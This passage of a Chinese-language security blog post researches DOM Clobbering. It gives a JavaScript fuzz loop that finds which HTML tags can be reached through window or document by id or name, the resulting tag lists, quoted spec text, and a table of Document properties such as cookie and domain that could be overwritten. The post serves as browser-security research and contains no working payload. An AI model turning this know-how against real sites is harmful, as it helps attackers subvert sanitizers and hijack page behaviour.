class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> html = [...];<span class="hljs-comment">//HTML elements array</span></span><br><span class="line"><span class="hljs-keyword">var</span> log = [];</span><br><span class="line"><span class="hljs-keyword">var</span> div = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;div&quot;</span>);</span><br><span class="line"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; html.length; i++) {</span><br><span class="line">  div.innerHTML = <span class="hljs-string">&quot;&lt;&quot;</span> + html[i] + <span class="hljs-string">&quot; id=x &gt;&quot;</span>;</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.appendChild(div);</span><br><span class="line">  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">window</span>.x == <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>) &amp;&amp; <span class="hljs-built_in">window</span>.x != <span class="hljs-literal">undefined</span>) {</span><br><span class="line">    log.push(html[i]);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.removeChild(div);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log(log);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x9664;&#x4E86;&#x5728; [Not Clobbered](#Not Clobbered) &#x90E8;&#x5206;&#x7684;&#x6807;&#x7B7E;&#xFF0C;&#x5176;&#x4ED6;&#x6807;&#x7B7E;<code>window</code>&#x5747;&#x53EF;&#x901A;&#x8FC7; id &#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x83B7;&#x53D6;</p><p></p><figure class="highlight scheme hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="hljs-name">128</span>) [<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;abbr&quot;</span>, <span class="hljs-string">&quot;acronym&quot;</span>, <span class="hljs-string">&quot;address&quot;</span>, <span class="hljs-string">&quot;applet&quot;</span>, <span class="hljs-string">&quot;area&quot;</span>, <span class="hljs-string">&quot;article&quot;</span>, <span class="hljs-string">&quot;aside&quot;</span>, <span class="hljs-string">&quot;audio&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;base&quot;</span>, <span class="hljs-string">&quot;basefont&quot;</span>, <span class="hljs-string">&quot;bdi&quot;</span>, <span class="hljs-string">&quot;bdo&quot;</span>, <span class="hljs-string">&quot;bgsound&quot;</span>, <span class="hljs-string">&quot;big&quot;</span>, <span class="hljs-string">&quot;blink&quot;</span>, <span class="hljs-string">&quot;blockquote&quot;</span>, <span class="hljs-string">&quot;br&quot;</span>, <span class="hljs-string">&quot;button&quot;</span>, <span class="hljs-string">&quot;canvas&quot;</span>, <span class="hljs-string">&quot;center&quot;</span>, <span class="hljs-string">&quot;cite&quot;</span>, <span class="hljs-string">&quot;code&quot;</span>, <span class="hljs-string">&quot;command&quot;</span>, <span class="hljs-string">&quot;content&quot;</span>, <span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;datalist&quot;</span>, <span class="hljs-string">&quot;dd&quot;</span>, <span class="hljs-string">&quot;del&quot;</span>, <span class="hljs-string">&quot;details&quot;</span>, <span class="hljs-string">&quot;dfn&quot;</span>, <span class="hljs-string">&quot;dialog&quot;</span>, <span class="hljs-string">&quot;dir&quot;</span>, <span class="hljs-string">&quot;div&quot;</span>, <span class="hljs-string">&quot;dl&quot;</span>, <span class="hljs-string">&quot;dt&quot;</span>, <span class="hljs-string">&quot;element&quot;</span>, <span class="hljs-string">&quot;em&quot;</span>, <span class="hljs-string">&quot;embed&quot;</span>, <span class="hljs-string">&quot;fieldset&quot;</span>, <span class="hljs-string">&quot;figcaption&quot;</span>, <span class="hljs-string">&quot;figure&quot;</span>, <span class="hljs-string">&quot;font&quot;</span>, <span class="hljs-string">&quot;footer&quot;</span>, <span class="hljs-string">&quot;form&quot;</span>, <span class="hljs-string">&quot;h1&quot;</span>, <span class="hljs-string">&quot;header&quot;</span>, <span class="hljs-string">&quot;hgroup&quot;</span>, <span class="hljs-string">&quot;hr&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;iframe&quot;</span>, <span class="hljs-string">&quot;iframes&quot;</span>, <span class="hljs-string">&quot;image&quot;</span>, <span class="hljs-string">&quot;img&quot;</span>, <span class="hljs-string">&quot;input&quot;</span>, <span class="hljs-string">&quot;ins&quot;</span>, <span class="hljs-string">&quot;isindex&quot;</span>, <span class="hljs-string">&quot;kbd&quot;</span>, <span class="hljs-string">&quot;keygen&quot;</span>, <span class="hljs-string">&quot;label&quot;</span>, <span class="hljs-string">&quot;legend&quot;</span>, <span class="hljs-string">&quot;li&quot;</span>, <span class="hljs-string">&quot;link&quot;</span>, <span class="hljs-string">&quot;listing&quot;</span>, <span class="hljs-string">&quot;main&quot;</span>, <span class="hljs-string">&quot;map&quot;</span>, <span class="hljs-string">&quot;mark&quot;</span>, <span class="hljs-string">&quot;marquee&quot;</span>, <span class="hljs-string">&quot;menu&quot;</span>, <span class="hljs-string">&quot;menuitem&quot;</span>, <span class="hljs-string">&quot;meta&quot;</span>, <span class="hljs-string">&quot;meter&quot;</span>, <span class="hljs-string">&quot;multicol&quot;</span>, <span class="hljs-string">&quot;nav&quot;</span>, <span class="hljs-string">&quot;nextid&quot;</span>, <span class="hljs-string">&quot;nobr&quot;</span>, <span class="hljs-string">&quot;noembed&quot;</span>, <span class="hljs-string">&quot;noframes&quot;</span>, <span class="hljs-string">&quot;noscript&quot;</span>, <span class="hljs-string">&quot;object&quot;</span>, <span class="hljs-string">&quot;ol&quot;</span>, <span class="hljs-string">&quot;optgroup&quot;</span>, <span class="hljs-string">&quot;option&quot;</span>, <span class="hljs-string">&quot;output&quot;</span>, <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;picture&quot;</span>, <span class="hljs-string">&quot;plaintext&quot;</span>, <span class="hljs-string">&quot;pre&quot;</span>, <span class="hljs-string">&quot;progress&quot;</span>, <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>, <span class="hljs-string">&quot;rp&quot;</span>, <span class="hljs-string">&quot;rt&quot;</span>, <span class="hljs-string">&quot;rtc&quot;</span>, <span class="hljs-string">&quot;ruby&quot;</span>, <span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;samp&quot;</span>, <span class="hljs-string">&quot;script&quot;</span>,&#xA0;&#x2026;]</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Window-amp-Name"><a href="#Window-amp-Name" class="headerlink" title="Window &amp; Name"></a>Window &amp; Name</h3><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">window</span>.x == <span class="hljs-built_in">document</span>.getElementsByName(<span class="hljs-string">&quot;x&quot;</span>)[<span class="hljs-number">0</span>] &amp;&amp; <span class="hljs-built_in">window</span>.x != <span class="hljs-literal">undefined</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x4E0E; document &#x4E00;&#x81F4;&#xFF0C;&#x53EA;&#x6709;&#x4E94;&#x4E2A;&#x6807;&#x7B7E;&#x53EF;&#x4EE5;&#x8BA9;<code>window</code>&#x901A;&#x8FC7; name &#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x83B7;&#x53D6;</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#xA0;[<span class="hljs-string">&quot;embed&quot;</span>, <span class="hljs-string">&quot;form&quot;</span>, <span class="hljs-string">&quot;image&quot;</span>, <span class="hljs-string">&quot;img&quot;</span>, <span class="hljs-string">&quot;object&quot;</span>]</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x2018;Not-Clobbered&#x2019;"><a href="#&#x2018;Not-Clobbered&#x2019;" class="headerlink" title="&#x2018;Not Clobbered&#x2019;"></a>&#x2018;Not Clobbered&#x2019;</h3><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="hljs-string">&quot;body&quot;</span>, <span class="hljs-string">&quot;caption&quot;</span>, <span class="hljs-string">&quot;col&quot;</span>, <span class="hljs-string">&quot;colgroup&quot;</span>, <span class="hljs-string">&quot;frame&quot;</span>, <span class="hljs-string">&quot;frameset&quot;</span>, <span class="hljs-string">&quot;head&quot;</span>, <span class="hljs-string">&quot;html&quot;</span>, <span class="hljs-string">&quot;tbody&quot;</span>, <span class="hljs-string">&quot;td&quot;</span>, <span class="hljs-string">&quot;tfoot&quot;</span>, <span class="hljs-string">&quot;th&quot;</span>, <span class="hljs-string">&quot;thead&quot;</span>, <span class="hljs-string">&quot;tr&quot;</span>]</span><br></pre></td></tr></tbody></table></figure><p></p><p>PS: &#x8FD9;&#x90E8;&#x5206;&#x5E76;&#x4E0D;&#x662F;&#x771F;&#x6B63;&#x4E0D;&#x80FD; Clobbered &#xFF0C;&#x56E0;&#x4E3A;&#x6BD4;&#x5982;&#x8BF4;<code>body</code>&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x672C;&#x8EAB;&#x754C;&#x9762;&#x5B58;&#x5728;&#x4E00;&#x4E2A;<code>body</code>&#x6807;&#x7B7E;&#xFF0C;&#x53EA;&#x662F;&#x5728;&#x6211;&#x6D4B;&#x8BD5;&#x6784;&#x5EFA;&#x7684;&#x7B80;&#x5355;&#x7684; HTML &#x9875;&#x9762;&#x4E2D;&#xFF0C;&#x8FD9;&#x4E9B;&#x6807;&#x7B7E;&#x4E0D;&#x80FD;&#x88AB; Clobbered &#xFF0C;&#x800C;&#x4E14;&#x5728;&#x5B9E;&#x9645;&#x4E2D;&#x4E5F;&#x7528;&#x5230;&#x6BD4;&#x8F83;&#x5C11;&#x3002;&#x5E76;&#x4E14;&#x6839;&#x636E; Chromium &#x4E2D;&#x7684;&#x8BF4;&#x6CD5;&#x662F;&#x201D;but anything by id&#x201D;&#xFF0C;&#x6240;&#x4EE5;&#x5982;&#x679C;&#x9700;&#x8981;&#x901A;&#x8FC7;<code>Window.id</code>&#x7684;&#x5F62;&#x5F0F;&#x53BB;&#x83B7;&#x53D6;&#x6807;&#x7B7E;&#x7684;&#x8BDD;&#xFF0C;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x6807;&#x7B7E;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#xFF0C;&#x6216;&#x8005;&#x4E5F;&#x53EF;&#x4EE5;&#x5C3D;&#x529B;&#x53BB;&#x6784;&#x5EFA;&#x4E0B;&#x6587;&#x7684;&#x8981;&#x6C42;&#x3002;</p><h3 id="Dom-Doc"><a href="#Dom-Doc" class="headerlink" title="Dom Doc"></a>Dom Doc</h3><p>&#x5176;&#x5B9E;&#x5728; Dom &#x6807;&#x51C6;&#x4E2D;&#x4E5F;&#x6709;&#x63D0;&#x53CA;&#x8FC7;&#x8FD9;&#x90E8;&#x5206;&#xFF0C;&#x5728;<a href="https://html.spec.whatwg.org/multipage/dom.html#dom-document-currentscript" target="_blank" rel="noopener">A part of Document interface</a> &#x8FD9;&#x4E00;&#x6BB5;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6709;&#x76F8;&#x5173;&#x89C4;&#x5B9A;&#xFF1A;</p><blockquote><p>&#x200B;    The <code>Document</code> interface <a href="https://heycam.github.io/webidl/#dfn-support-named-properties" target="_blank" rel="noopener">supports named properties</a>. The <a href="https://heycam.github.io/webidl/#dfn-supported-property-names" target="_blank" rel="noopener">supported property names</a> of a <code>Document</code> object document at any moment consist of the following, in <a href="https://dom.spec.whatwg.org/#concept-tree-order" target="_blank" rel="noopener">tree order</a> according to the element that contributed them, ignoring later duplicates, and with values from <code>id</code> attributes coming before values from <code>name</code> attributes when the same element contributes both:</p><ul><li>the value of the <code>name</code> content attribute for all <a href="https://html.spec.whatwg.org/multipage/dom.html#exposed" target="_blank" rel="noopener">exposed</a> <code>embed</code>, <code>form</code>, <code>iframe</code>, <code>img</code>, and <a href="https://html.spec.whatwg.org/multipage/dom.html#exposed" target="_blank" rel="noopener">exposed</a> <code>object</code> elements that have a non-empty <code>name</code> content attribute and are <a href="https://dom.spec.whatwg.org/#in-a-document-tree" target="_blank" rel="noopener">in a document tree</a> with document as their <a href="https://dom.spec.whatwg.org/#concept-tree-root" target="_blank" rel="noopener">root</a>;</li><li>the value of the <code>id</code> content attribute for all <a href="https://html.spec.whatwg.org/multipage/dom.html#exposed" target="_blank" rel="noopener">exposed</a> <code>object</code> elements that have a non-empty <code>id</code> content attribute and are <a href="https://dom.spec.whatwg.org/#in-a-document-tree" target="_blank" rel="noopener">in a document tree</a> with document as their <a href="https://dom.spec.whatwg.org/#concept-tree-root" target="_blank" rel="noopener">root</a>; and</li><li>the value of the <code>id</code> content attribute for all <code>img</code> elements that have both a non-empty <code>id</code> content attribute and a non-empty <code>name</code> content attribute, and are <a href="https://dom.spec.whatwg.org/#in-a-document-tree" target="_blank" rel="noopener">in a document tree</a> with document as their <a href="https://dom.spec.whatwg.org/#concept-tree-root" target="_blank" rel="noopener">root</a>.</li></ul></blockquote><p>&#x4E5F;&#x6709;&#x5173;&#x4E8E;<a href="https://html.spec.whatwg.org/multipage/window-object.html#named-access-on-the-window-object" target="_blank" rel="noopener"> Window &#x5BF9;&#x8C61;&#x7684;&#x90E8;&#x5206;</a>&#xFF1A;</p><blockquote><p>&#x200B;    The <code>Window</code> object <a href="https://heycam.github.io/webidl/#dfn-support-named-properties" target="_blank" rel="noopener">supports named properties</a>. The <a href="https://heycam.github.io/webidl/#dfn-supported-property-names" target="_blank" rel="noopener">supported property names</a> of a <code>Window</code> object window at any moment consist of the following, in <a href="https://dom.spec.whatwg.org/#concept-tree-order" target="_blank" rel="noopener">tree order</a> according to the element that contributed them, ignoring later duplicates:</p><ul><li>window&#x2019;s <a href="https://html.spec.whatwg.org/multipage/window-object.html#document-tree-child-browsing-context-name-property-set" target="_blank" rel="noopener">document-tree child browsing context name property set</a>;</li><li>the value of the <code>name</code> content attribute for all <code>embed</code>, <code>form</code>, <code>img</code>, and <code>object</code> elements that have a non-empty <code>name</code> content attribute and are <a href="https://dom.spec.whatwg.org/#in-a-document-tree" target="_blank" rel="noopener">in a document tree</a> with window&#x2019;s <a href="https://html.spec.whatwg.org/multipage/window-object.html#concept-document-window" target="_blank" rel="noopener">associated <code>Document</code></a> as their <a href="https://dom.spec.whatwg.org/#concept-tree-root" target="_blank" rel="noopener">root</a>; and</li><li>the value of the <code>id</code> content attribute for all <a href="https://html.spec.whatwg.org/multipage/infrastructure.html#html-elements" target="_blank" rel="noopener">HTML elements</a> that have a non-empty <code>id</code> content attribute and are <a href="https://dom.spec.whatwg.org/#in-a-document-tree" target="_blank" rel="noopener">in a document tree</a> with window&#x2019;s <a href="https://html.spec.whatwg.org/multipage/window-object.html#concept-document-window" target="_blank" rel="noopener">associated <code>Document</code></a> as their <a href="https://dom.spec.whatwg.org/#concept-tree-root" target="_blank" rel="noopener">root</a>.</li></ul></blockquote><h3 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h3><p>&#x5173;&#x4E8E; window &#x5BF9;&#x8C61;&#xFF0C;&#x867D;&#x7136; window &#x5BF9;&#x8C61;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; id &#x76F4;&#x63A5;&#x83B7;&#x53D6;&#x6807;&#x7B7E;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x76EE;&#x524D;&#x8FD8;&#x6CA1;&#x53D1;&#x73B0;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x901A;&#x8FC7;&#x6807;&#x7B7E; id &#x8FDB;&#x884C; clobber &#x7684;&#x5C5E;&#x6027;&#xFF0C;&#x6BD5;&#x7ADF;&#x662F;&#x57FA;&#x4E8E; Dom &#x7684;&#x653B;&#x51FB;&#x6280;&#x672F;&#x3002;</p><h3 id="Document"><a href="#Document" class="headerlink" title="Document"></a>Document</h3><p>&#x81F3;&#x4E8E; Document &#x5BF9;&#x8C61;&#xFF0C;&#x6211;&#x5217;&#x4E3E;&#x4E86;&#x4E00;&#x4E0B; Document &#x5BF9;&#x8C61;&#x7279;&#x6709;&#x7684;&#x5C5E;&#x6027;&#x4EE5;&#x53CA;&#x5176;&#x5BF9;&#x5E94;&#x7684;&#x7C7B;&#x578B;&#xFF1A;</p><table><thead><tr><th>Class</th><th>Attr</th></tr></thead><tbody><tr><td>DOMImplementation</td><td>[&#x201C;implementation&#x201D;]</td></tr><tr><td>HTMLCollection</td><td>[&#x201C;images&#x201D;, &#x201C;embeds&#x201D;, &#x201C;plugins&#x201D;, &#x201C;links&#x201D;, &#x201C;forms&#x201D;, &#x201C;scripts&#x201D;, &#x201C;anchors&#x201D;, &#x201C;applets&#x201D;, &#x201C;children&#x201D;]</td></tr><tr><td>String</td><td>[&#x201C;documentURI&#x201D;, &#x201C;compatMode&#x201D;, &#x201C;characterSet&#x201D;, &#x201C;charset&#x201D;, &#x201C;inputEncoding&#x201D;, &#x201C;contentType&#x201D;, &#x201C;domain&#x201D;, &#x201C;referrer&#x201D;, &#x201C;cookie&#x201D;, &#x201C;lastModified&#x201D;, &#x201C;readyState&#x201D;, &#x201C;title&#x201D;, &#x201C;dir&#x201D;, &#x201C;designMode&#x201D;, &#x201C;fgColor&#x201D;, &#x201C;linkColor&#x201D;, &#x201C;vlinkColor&#x201D;, &#x201C;alinkColor&#x201D;, &#x201C;bgColor&#x201D;, &#x201C;visibilityState&#x201D;, &#x201C;webkitVisibilityState&#x201D;, &#x201C;nodeName&#x201D;, &#x201C;baseURI&#x201D;]</td></tr><tr><td>HTMLBodyElement</td><td>[&#x201C;body&#x201D;, &#x201C;activeElement&#x201D;]</td></tr><tr><td>HTMLHeadElement</td><td>[&#x201C;head&#x201D;]</td></tr><tr><td>HTMLScriptElement</td><td>[&#x201C;currentScript&#x201D;]</td></tr><tr><td>HTMLAllCollection</td><td>[&#x201C;all&#x201D;]</td></tr><tr><td>NodeList</td><td>[&#x201C;childNodes&#x201D;]</td></tr><tr><td>Window</td><td>[&#x201C;defaultView&#x201D;]</td></tr><tr><td>DocumentType</td><td>[&#x201C;doctype&#x201D;, &#x201C;firstChild&#x201D;]</td></tr><tr><td>Boolean</td><td>[&#x201C;xmlStandalone&#x201D;, &#x201C;hidden&#x201D;, &#x201C;wasDiscarded&#x201D;, &#x201C;webkitHidden&#x201D;, &#x201C;fullscreenEnabled&#x201D;, &#x201C;fullscreen&#x201D;, &#x201C;webkitIsFullScreen&#x201D;, &#x201C;webkitFullscreenEnabled&#x201D;, &#x201C;pictureInPictureEnabled&#x201D;, &#x201C;isConnected&#x201D;]</td></tr><tr><td>FontFaceSet</td><td>[&#x201C;fonts&#x201D;]</td></tr><tr><td>StyleSheetList</td><td>[&#x201C;styleSheets&#x201D;]</td></tr><tr><td>Function</td><td>[&#x201C;getElementsByTagName&#x201D;, &#x201C;getElementsByTagNameNS&#x201D;, &#x201C;getElementsByClassName&#x201D;, &#x201C;createDocumentFragment&#x201D;, &#x201C;createTextNode&#x201D;, &#x201C;createCDATASection&#x201D;, &#x201C;createComment&#x201D;, &#x201C;createProcessingInstruction&#x201D;, &#x201C;importNode&#x201D;, &#x201C;adoptNode&#x201D;, &#x201C;createAttribute&#x201D;, &#x201C;createAttributeNS&#x201D;, &#x201C;createEvent&#x201D;, &#x201C;createRange&#x201D;, &#x201C;createNodeIterator&#x201D;, &#x201C;createTreeWalker&#x201D;, &#x201C;getElementsByName&#x201D;, &#x201C;write&#x201D;, &#x201C;writeln&#x201D;, &#x201C;hasFocus&#x201D;, &#x201C;execCommand&#x201D;, &#x201C;queryCommandEnabled&#x201D;, &#x201C;queryCommandIndeterm&#x201D;, &#x201C;queryCommandState&#x201D;, &#x201C;queryCommandSupported&#x201D;, &#x201C;queryCommandValue&#x201D;, &#x201C;clear&#x201D;, &#x201C;exitPointerLock&#x201D;, &#x201C;createElement&#x201D;, &#x201C;createElementNS&#x201D;, &#x201C;caretRangeFromPoint&#x201D;, &#x201C;elementFromPoint&#x201D;, &#x201C;elementsFromPoint&#x201D;, &#x201C;getElementById&#x201D;, &#x201C;prepend&#x201D;, &#x201C;append&#x201D;, &#x201C;querySelector&#x201D;, &#x201C;querySelectorAll&#x201D;, &#x201C;exitFullscreen&#x201D;, &#x201C;webkitCancelFullScreen&#x201D;, &#x201C;webkitExitFullscreen&#x201D;, &#x201C;createExpression&#x201D;, &#x201C;createNSResolver&#x201D;, &#x201C;evaluate&#x201D;, &#x201C;registerElement&#x201D;, &#x201C;exitPictureInPicture&#x201D;, &#x201C;hasChildNodes&#x201D;, &#x201C;getRootNode&#x201D;, &#x201C;normalize&#x201D;, &#x201C;cloneNode&#x201D;, &#x201C;isEqualNode&#x201D;, &#x201C;isSameNode&#x201D;, &#x201C;compareDocumentPosition&#x201D;, &#x201C;contains&#x201D;, &#x201C;lookupPrefix&#x201D;, &#x201C;lookupNamespaceURI&#x201D;, &#x201C;isDefaultNamespace&#x201D;, &#x201C;insertBefore&#x201D;, &#x201C;appendChild&#x201D;, &#x201C;replaceChild&#x201D;, &#x201C;removeChild&#x201D;]</td></tr><tr><td>NodeList</td><td>[&#x201C;childNodes&#x201D;]</td></tr><tr><td>Array</td><td>[&#x201C;adoptedStyleSheets&#x201D;]</td></tr><tr><td>FeaturePolicy</td><td>[&#x201C;featurePolicy&#x201D;]</td></tr><tr><td>Null</td><td>[&#x201C;xmlEncoding&#x201D;, &#x201C;xmlVersion&#x201D;, &#x201C;onreadystatechange&#x201D;, &#x201C;onpointerlockchange&#x201D;, &#x201C;onpointerlockerror&#x201D;, &#x201C;onbeforecopy&#x201D;, &#x201C;onbeforecut&#x201D;, &#x201C;onbeforepaste&#x201D;, &#x201C;onfreeze&#x201D;, &#x201C;onresume&#x201D;, &#x201C;onsecuritypolicyviolation&#x201D;, &#x201C;onvisibilitychange&#x201D;, &#x201C;oncopy&#x201D;, &#x201C;oncut&#x201D;, &#x201C;onpaste&#x201D;, &#x201C;pointerLockElement&#x201D;, &#x201C;fullscreenElement&#x201D;, &#x201C;onfullscreenchange&#x201D;, &#x201C;onfullscreenerror&#x201D;, &#x201C;webkitCurrentFullScreenElement&#x201D;, &#x201C;webkitFullscreenElement&#x201D;, &#x201C;onwebkitfullscreenchange&#x201D;, &#x201C;onwebkitfullscreenerror&#x201D;, &#x201C;rootElement&#x201D;, &#x201C;pictureInPictureElement&#x201D;, &#x201C;ownerDocument&#x201D;, &#x201C;parentNode&#x201D;, &#x201C;parentElement&#x201D;, &#x201C;previousSibling&#x201D;, &#x201C;nextSibling&#x201D;, &#x201C;nodeValue&#x201D;, &#x201C;textContent&#x201D;]</td></tr></tbody></table><p>&#x5176;&#x4E2D;&#xFF0C;<code>HTMLBodyElement</code>/<code>HTMLHeadElement</code>/<code>HTMLScriptElement</code> &#x5747;&#x7EE7;&#x627F;&#x81EA;<code>HTMLElement</code>&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x9700;&#x8981;&#x8FD9;&#x4E9B;&#x5462;&#xFF1F;&#x56E0;&#x4E3A;&#x5728;&#x5F88;&#x591A;&#x65F6;&#x5019;&#x6211;&#x4EEC; Clobber &#x5F97;&#x5230;&#x7684;&#x5C31;&#x662F;&#x4E00;&#x4E2A;<code>HTMLElement</code>&#xFF0C;&#x800C; Document &#x67D0;&#x4E9B;&#x5C5E;&#x6027;&#x5F97;&#x5230;&#x7684;&#x4E5F;&#x662F;&#x4E00;&#x4E2A;<code>HTMLElement</code>&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5229;&#x7528;&#x3002;</p><h2 id="Cause"><a href="#Cause" class="headerlink" title="Cause"></a>Cause</h2><p>&#x6211;&#x60F3;&#x5982;&#x679C;&#x80FD;&#x8986;&#x76D6;&#x7684;&#x8BDD;&#xFF0C;&#x5E94;&#x8BE5;&#x5C31;&#x662F;&#x5728;&#x8C03;&#x7528;<code>document.x</code>&#x7684;&#x65F6;&#x5019;&#xFF0C; Dom &#x6811;&#x89E3;&#x6790;&#x5F97;&#x5230;&#x7684;&#x7ED3;&#x679C;&#x8981;&#x4F18;&#x5148;&#x4E8E;<code>document</code>&#x81EA;&#x5DF1;&#x672C;&#x8EAB;&#x5C5E;&#x6027;&#xFF0C;&#x6240;&#x4EE5;&#x4EA7;&#x751F;&#x4E86;&#x8FD9;&#x6837;&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x91CC;&#x4E5F;&#x6709;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x5C31;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#x6211;&#x4EEC;&#x5728;&#x8986;&#x76D6;<code>cookie</code>&#x7684;&#x65F6;&#x5019;&#x5374;&#x4E0D;&#x80FD;&#x5B8C;&#x5168;&#x63A7;&#x5236;&#x8986;&#x76D6;&#x5462;&#xFF1F;</p><p>&#x5E26;&#x7740;&#x8FD9;&#x4E9B;&#x7591;&#x95EE;&#xFF0C;&#x6211;&#x7279;&#x5730;&#x53BB;&#x770B;&#x4E86;&#x4E00;&#x4F1A; chromium &#x7684;&#x6E90;&#x7801;&#xFF0C;&#x7B80;&#x7565;&#x5730;&#x770B;&#x4E86;&#x4E00;&#x4E0B;&#x8FD9;&#x4E9B;&#x5B9E;&#x73B0;&#xFF0C;&#x4E3B;&#x8981;&#x5728; chromium &#x7684; blink &#x90E8;&#x5206;&#x3002;&#x7531;&#x4E8E;&#x81EA;&#x5DF1;&#x77E5;&#x8BC6;&#x6D45;&#x8584;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x5B8C;&#x6574;&#x5730;&#x9605;&#x8BFB;&#x8FC7; chromium &#x6E90;&#x7801;&#xFF0C;&#x8FD9;&#x91CC;&#x8FD8;&#x53EF;&#x80FD;&#x8BBE;&#x8BA1;&#x5230;&#x4E00;&#x4E9B;&#x7F16;&#x8BD1;&#x539F;&#x7406;&#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x5E76;&#x6CA1;&#x6709;&#x5B89;&#x5168;&#x628A;&#x6574;&#x4E2A; Chromium &#x4EA7;&#x751F;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x7684;&#x7F18;&#x7531;&#x4EE5;&#x4EE3;&#x7801;&#x8FFD;&#x8E2A;&#x7684;&#x5F62;&#x5F0F;&#x5F04;&#x51FA;&#x6765;&#xFF0C;&#x5982;&#x679C;&#x8981;&#x5F04;&#x7684;&#x8BDD;&#x4F30;&#x8BA1;&#x4E5F;&#x5F97;&#x53BB; debug Chromium &#xFF0C;&#x90A3;&#x5C31;&#x662F;&#x53E6;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x7684;&#x5185;&#x5BB9;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x4E2A;&#x90E8;&#x5206;&#x8FD8;&#x6709;&#x5F85;&#x7EE7;&#x7EED;&#x7814;&#x7A76;&#xFF0C;&#x4E0D;&#x8FC7;&#x6211;&#x628A;&#x81EA;&#x5DF1;&#x770B;&#x7684;&#x4E00;&#x4E9B;&#x6709;&#x7528;&#x7684;&#x90E8;&#x5206;&#x5199;&#x51FA;&#x6765;&#x3002;&#x5982;&#x679C;&#x6709;&#x5174;&#x8DA3;&#x7684;&#x670B;&#x53CB;&#x53EF;&#x4EE5;&#x8054;&#x7CFB;&#x6211;&#x4E00;&#x8D77;&#x7814;&#x7A76;&#x770B;&#x770B;&#x3002;&#xFF08;&#x867D;&#x7136;&#x6211;&#x5F88;&#x83DC;XD</p><p>&#x5168;&#x90E8;&#x4EE3;&#x7801;&#x6765;&#x6E90;&#x4E8E; <a href="https://source.chromium.org/" target="_blank" rel="noopener">Chomiunm Code Search</a>&#xFF0C;&#x8FD9;&#x4E2A;&#x5E73;&#x53F0;&#x53EF;&#x4EE5;&#x6BD4;&#x8F83;&#x65B9;&#x4FBF;&#x5BA1;&#x4EE3;&#x7801;&#x3002;</p><h3 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h3><p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;<code>location</code>&#xFF0C;&#x6211;&#x4EEC;&#x65E2;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>window.location</code>&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>document.location</code>&#x62FF;&#x5230;<code>location</code>&#xFF0C;&#x8FD9;&#x4E5F;&#x80FD;&#x8BF4;&#x660E;&#x6211;&#x4EEC;&#x4E3A;&#x4EC0;&#x4E48;&#x4E0A;&#x6587;&#x8981;&#x5355;&#x72EC; fuzz Document &#x7279;&#x6709;&#x7684;&#x5C5E;&#x6027;&#x800C;&#x4E0D;&#x662F;&#x5168;&#x90E8;&#x5C5E;&#x6027;&#x4E86;&#x3002;</p><p>&#x5728; Chromium &#x6E90;&#x7801;&#x4E2D;&#xFF0C;&#x627E;&#x5230;<code>location</code>&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C; Chromium 